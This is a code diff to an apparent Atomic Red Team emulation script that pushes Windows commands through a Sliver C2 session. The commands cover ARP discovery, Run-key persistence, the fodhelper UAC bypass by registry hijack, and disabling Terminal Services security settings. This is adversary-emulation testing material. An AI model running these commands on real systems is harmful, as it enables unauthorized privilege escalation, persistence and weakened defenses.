@@ -68,7 +68,7 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
+    commands = f"""
     arp -a
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
@@ -98,8 +98,8 @@ async def main():
     if not user_input and False:
         raise ValueError("Missing required parameter: command_to_execute")
     user_params["command_to_execute"] = user_input
-    commands = """
-    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+    commands = f"""
+    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "{user_params["command_to_execute"]}"
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
 
@@ -211,8 +211,8 @@ async def main():
     if not user_input and False:
         raise ValueError("Missing required parameter: executable_binary")
     user_params["executable_binary"] = user_input
-    commands = """
-    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+    commands = f"""
+    reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{user_params["executable_binary"]}" /f
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
     fodhelper.exe
     """
@@ -277,7 +277,7 @@ async def main():
     print_finished_message()
 
     confirm_action()
-    commands = """
+    commands = f"""
     reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
